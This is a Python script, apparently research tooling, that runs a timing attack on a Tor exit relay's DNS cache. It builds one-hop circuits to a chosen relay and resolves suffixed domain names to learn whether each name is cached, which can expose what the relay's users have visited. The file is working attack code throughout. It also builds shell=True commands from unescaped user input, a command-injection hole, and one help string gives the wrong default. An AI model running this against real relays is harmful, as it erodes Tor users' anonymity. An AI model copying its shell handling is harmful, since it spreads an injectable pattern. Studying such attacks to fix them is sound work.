#!/usr/bin/env python3

import os
import sys
import time
import argparse
import subprocess

import logging
log = logging.getLogger(__name__)

CONF_WAIT         = 5   # seconds to wait after various types of configurations
BOOTSTRAP_TIMEOUT = 60  # seconds before giving up on bootstrapping tor
BOOTSTRAP_TRIES   = 2   # number of times to try bootstrapping tor before fatal error
QUERY_TIMEOUT     = 10  # seconds before tor-resolve gives up on a domain name
RUN_TIMEOUT       = 600 # seconds to wait for all domain name look-ups to complete
MAX_ERRORS        = 1   # number of tor-resolve errors before giving up on a circuit

def parse_args():
    parser = argparse.ArgumentParser(description="timeless timing attack against tor's DNS cache")
    parser.add_argument("-d", "--directory",
        type=str, default="/tmp/timeless-timing-attack",
        help="directory to store log files and tor's data directory (Default: /tmp/timeless-timing-attack)",
    )
    parser.add_argument("-s", "--socks-port",
        type=int, default=9050,
        help="tor socks port (Default: 9050)",
    )
    parser.add_argument("-c", "--control-port",
        type=int, default=9051,
        help="tor control port (Default: 9051)",
    )
    parser.add_argument("-r", "--relay",
        type=str, default="DFRI0",
        help="relay to build a one-hop circuit to (Default: DFRI0)",
    )
    parser.add_argument("-n", "--names",
        type=str, default="rgdd.se,pulls.name",
        help="comma-separated list of domains names to resolve (Default: rgdd.se,pulls.name)",
    )
    parser.add_argument("-m", "--chunks",
        type=int, default=500,
        help="maximum number of timeless timing attack resolves to run in the same circuit (Default: 1000)",
    )
    return parser.parse_args()

def main(args):
    deadline = int(time.time()) + RUN_TIMEOUT
    tor_dir = f"{args.directory}/tor"
    num_run = 0
    num_err = 0
    output = []
    names = args.names.split(",")

    log.info(f"running timeless timing attack on {args.relay} with {len(names)} names")
    log.info(f"logs are stored in {args.directory}")
    while len(names) > 0:
        num_run += 1
        if int(time.time()) > deadline:
            log.warning(f"timeless timing attack failed to meet its deadline")
            break

        log_dir = f"{args.directory}/log/{num_run}"
        tor_pid, err = launch_tor(tor_dir, log_dir, args.socks_port, args.control_port)
        if err is not None:
            log.warning(f"launch_tor: {err}")
            break

        chunk = names[:min(len(names), args.chunks)]
        log.debug(f"chunk {num_run}: preparing to run {len(chunk)} resolves")
        answers = handle_chunk(deadline, f"{log_dir}/attach.log", args.socks_port, args.control_port, args.relay, chunk)
        if len(answers) != len(chunk):
            num_err += 1

        log.debug(f"closing tor")
        close_tor(tor_dir, tor_pid)

        output += answers
        names = names[len(answers):]
        if num_err >= MAX_ERRORS:
            log.warning(f"got {num_err} partial answers, giving up on relay {args.relay}")
            break

    log.info(f"received {len(output)}/{len(args.names.split(','))} answers")
    if len(output) == 0:
        return 1

    print(",".join(output))

def handle_chunk(deadline, attach_file, socks_port, control_port, relay, questions, conf_wait=CONF_WAIT):
    '''
    Returns a list of answers in the same order as questions were asked.  Fewer
    answers may be returned.  It is then safe to ask for the remaining ones.
    *  0: uncached
    *  1: cached
    * -1: local don't know (attach worked but no useful answer)
    * -2: global don't know (attach failed, we asked on an unknown circuit)
    '''
    carml_pid, circ_id, err = setup_carml(attach_file, control_port, relay)
    if err is not None:
        log.warning(f"setup_carml: {err}")
        return []

    answer, err = tor_resolve(attach_file, socks_port, "1.2.3.4")
    if err is not None or answer != "1.2.3.4":
        log.warning(f"tor_resolve: failed testing circuit")
        return []

    answers = []
    for question in questions:
        if int(time.time()) > deadline:
            log.warning(f"deadline exceeded")
            break

        name = f"{question}--sc"
        log.debug(f"next resolve is {name}")

        answer, err = tor_resolve(attach_file, socks_port, name)
        if err is not None:
            log.warning(f"tor_resolve: {err}")
            if err == "attach failure":
                answers += [ "-2" ] # question may be dirty (globally)
            else:
                answers += [ "-1" ] # question may be dirty (locally)
            break

        if answer == "0.0.0.0":
            answers += [ "0" ]
        elif answer == "1.1.1.1":
            answers += [ "1" ]
        else:
            log.warning(f"tor-resolve: malformed answer: {answer}")
            answers += [ "-1" ] # question may be dirty (locally)
            break

    teardown_carml(control_port, carml_pid, circ_id)
    return answers

def launch_tor(data_dir, log_dir, socks_port, control_port, timeout=BOOTSTRAP_TIMEOUT, tries=BOOTSTRAP_TRIES, conf_wait=CONF_WAIT):
    shell(f"rm -rf {log_dir}")
    shell(f"mkdir -p {log_dir}")
    shell(f"mkdir -p {data_dir}")

    torrc = f"{data_dir}/torrc"
    shell(f"echo DataDirectory {data_dir} > {torrc}")
    shell(f"echo SocksPort {socks_port} >> {torrc}")
    shell(f"echo ControlPort {control_port} >> {torrc}")
    shell(f"echo CookieAuthentication 1 >> {torrc}")
    shell(f"echo UseEntryGuards 0 >> {torrc}")
    shell(f"echo Log Notice file {log_dir}/tor.notice >> {torrc}")

    log.debug(f"launching tor with socks port {socks_port} and control port {control_port}")
    for i in range(0, tries):
        if os.path.exists(f"{data_dir}/lock"):
            return None, f"an instance already runs in {data_dir}"

        with open (f"{log_dir}/tor.stdout", "w") as f:
            p = subprocess.Popen(["tor", "-f", torrc], stderr=subprocess.DEVNULL, stdout=f)

        now = int(time.time())
        deadline = now + timeout
        while True:
            time.sleep(conf_wait)
            try:
                with open(f"{log_dir}/tor.notice", "r") as f:
                    if "Bootstrapped 100%" in f.read():
                        return p.pid, None
            except:
                pass

            now = int(time.time())
            if now > deadline:
                close_tor(data_dir, p.pid)
                break

    return None, f"bootstrap timed out after {tries} attempt(s)"

def close_tor(data_dir, tor_pid, conf_wait=CONF_WAIT):
    shell(f"kill -2 {tor_pid}")
    time.sleep(conf_wait)
    shell(f"rm -f {data_dir}/lock")

def tor_resolve(attach_file, socks_port, name, timeout=QUERY_TIMEOUT):
    stdout, stderr, retcode = shell(f"timeout {timeout} tor-resolve -p {socks_port} {name}")
    try:
        with open(attach_file, "r") as f:
            line = f.read().rstrip().split("\n")[-1]
            if not f"resolve {name}" in line:
                raise Exception("attach failure")
    except:
        return None, "attach failure"

    if retcode != 0:
        return None, "timeout" if len(stderr.rstrip()) == 0 else stderr.rstrip()
    if stdout.rstrip() == "":
        return None, "empty answer"
    return stdout.rstrip(), None

def setup_carml(log_file, control_port, relay, conf_wait=CONF_WAIT):
    log.debug(f"building one-hop circuit to {relay}")
    stdout, _, rc = shell("carml --connect tcp:127.0.0.1:{} circ -b {}".format(control_port, relay))
    circ_info = stdout.rstrip().split("\n")[-1]
    if rc != 0 or not "built" in circ_info:
        return None, None, "failed creating circuit via {}".format(relay)

    try:
        # force buffering such that carml's attach log can be read live
        os.environ["PYTHONUNBUFFERED"] = "1"

        circ_id = circ_info.split(" ")[2][:-1]
        with open(log_file, "w") as f:
            log.debug(f"attaching new streams to circuit {circ_id}")
            p = subprocess.Popen(
                ["carml", "--connect", "tcp:127.0.0.1:{}".format(control_port), "stream", "-a", circ_id],
                stderr=subprocess.DEVNULL,
                stdout=f,
            )
    except Exception as err:
        return None, None, f"failed attaching streams to circuit: {err}"

    time.sleep(conf_wait) # give carml's attach some time to start working
    return p.pid, circ_id, None

def teardown_carml(control_port, carml_pid, circ_id, conf_wait=CONF_WAIT):
    log.debug(f"removing carml's stream attacher")
    shell(f"kill -9 {carml_pid}")
    time.sleep(conf_wait)

    log.debug(f"deleting circuit {circ_id}")
    stdout, _, returncode = shell(f"carml --connect tcp:127.0.0.1:{control_port} circ --delete {circ_id}")
    circ_info = stdout.rstrip().split("\n")[-1]
    if returncode != 0 or not "OK" in circ_info:
        log.warning(f"failed closing circuit {circ_id}")

def shell(cmd):
    p = subprocess.run(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    return p.stdout.decode("utf-8"), p.stderr.decode("utf-8"), p.returncode

if __name__ == "__main__":
    logging.basicConfig(
        format="[%(levelname)s] %(asctime)s: %(message)s",
        level=logging.DEBUG,
    )
    sys.exit(main(parse_args()))
